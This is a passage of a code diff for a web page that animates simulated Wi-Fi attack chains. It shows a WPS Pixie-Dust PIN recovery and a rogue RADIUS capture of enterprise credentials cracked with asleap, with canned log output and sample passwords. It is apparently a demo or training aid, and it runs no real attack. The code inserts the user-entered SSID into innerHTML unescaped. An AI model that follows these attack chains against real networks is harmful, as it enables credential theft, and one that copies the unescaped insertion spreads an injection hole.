+        [2000,`<span style="color:var(--text-dim)">[+]</span> Associated with AA:BB:CC:DD:EE:FF`],
+        [2600,`<span style="color:var(--accent)">[+]</span> Received M1 — E-Nonce captured`],
+        [3000,`<span style="color:var(--accent)">[+]</span> Received M3 — E-Hash1/E-Hash2 captured`],
+        [3500,`<span style="color:var(--warn)">[Pixie-Dust]</span> Weak PRNG detected: E-S1 = 0x000...`],
+        [4000,`<span style="color:var(--warn)">[Pixie-Dust]</span> Computing PIN offline...`],
+        [4600,`<span style="color:var(--accent2)">[Pixie-Dust]</span> WPS PIN: 12345678`],
+        [5000,`<span style="color:var(--accent2)">[+]</span> WPA PSK: <span style="font-weight:700">Str0ngP@ss!</span>`],
+        [5200,`<span style="color:var(--text-dim)">[*]</span> Time taken: 0h 0m 4s`],
+      ],
+      result: [['SSID','{ssid}'],['WPS PIN','12345678'],['WPA PSK','Str0ngP@ss!'],['Time','4 seconds']]
+    },
+    5: {
+      label: 'Enterprise Rogue RADIUS',
+      steps: [
+        [0,   `<span style="color:var(--accent2)">[*]</span> Generating self-signed RADIUS certs...`],
+        [700, `<span style="color:var(--accent2)">[*]</span> hostapd-wpe: {ssid} WPA2-Enterprise CH6`],
+        [1200,`<span style="color:var(--accent2)">[✓]</span> Rogue RADIUS server active`],
+        [2000,`<span style="color:var(--accent3)">[+]</span> Client alice@corp.com connecting...`],
+        [2700,`<span style="color:var(--text-dim)">[..]</span> TLS handshake — client accepted self-signed cert`],
+        [3300,`<span style="color:var(--accent2)">[CAPTURED]</span> MSCHAPv2: alice@corp.com`],
+        [3800,`<span style="color:var(--warn)">    challenge: 5d:9b:4b:1f:3a:2e:7c:8d`],
+        [4100,`<span style="color:var(--accent3)">    response:  a1:b2:c3:d4:e5:f6:a7:b8...`],
+        [4800,`<span style="color:var(--accent2)">[*]</span> asleap cracking MSCHAPv2...`],
+        [5800,`<span style="color:var(--accent2)">[CRACKED]</span> alice@corp.com → <span style="color:var(--accent2);font-weight:700">Summer2024!</span>`],
+        [6200,`<span style="color:var(--text-dim)">[*]</span> AD credentials valid for email, VPN, SharePoint`],
+      ],
+      result: [['User','alice@corp.com'],['Password','Summer2024!'],['Scope','Active Directory — email, VPN, intranet'],['Method','Rogue RADIUS PEAP-MSCHAPv2 capture + asleap']]
+    }
+  };
+
+  function runChain() {
+    if (simRunning) return;
+    simRunning = true;
+
+    const chainNum = parseInt(document.getElementById('chainSelect').value);
+    const ssid     = document.getElementById('simSSID').value || 'TargetNetwork';
+    const chain    = CHAINS[chainNum];
+    const output   = document.getElementById('chainOutput');
+    const prog     = document.getElementById('simProg');
+    const fill     = document.getElementById('progFill');
+    const pct      = document.getElementById('progPct');
+    const label    = document.getElementById('progLabel');
+    const resultBox= document.getElementById('resultBox');
+    const btn      = document.getElementById('simBtn');
+
+    output.innerHTML = '';
+    resultBox.classList.remove('show');
+    prog.classList.add('show');
+    fill.style.width = '0%'; pct.textContent = '0%';
+    label.textContent = chain.label;
+    btn.disabled = true;
+
+    const sub = (s) => s.replace(/\{ssid\}/g, ssid);
+
+    const totalDuration = chain.steps[chain.steps.length - 1][0] + 1200;
+
+    chain.steps.forEach(([delay, msg]) => {
+      setTimeout(() => {
+        output.innerHTML += sub(msg) + '\n';
+        output.scrollTop = output.scrollHeight;
+        const p = Math.round((delay / totalDuration) * 90);
+        fill.style.width = p + '%'; pct.textContent = p + '%';
+      }, delay);
+    });
+
+    setTimeout(() => {
+      fill.style.width = '100%'; pct.textContent = '100%';
+      document.getElementById('resultItems').innerHTML =
+        chain.result.map(([k,v]) =>
+          `<div class="rb-item"><span class="rb-key">${k ? k+': ' : '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'}</span><span class="rb-val">${sub(v)}</span></div>`
+        ).join('');
+      resultBox.classList.add('show');
+      simRunning = false; btn.disabled = false;
+    }, totalDuration);
+  }
+</script>
+</body>
+</html>
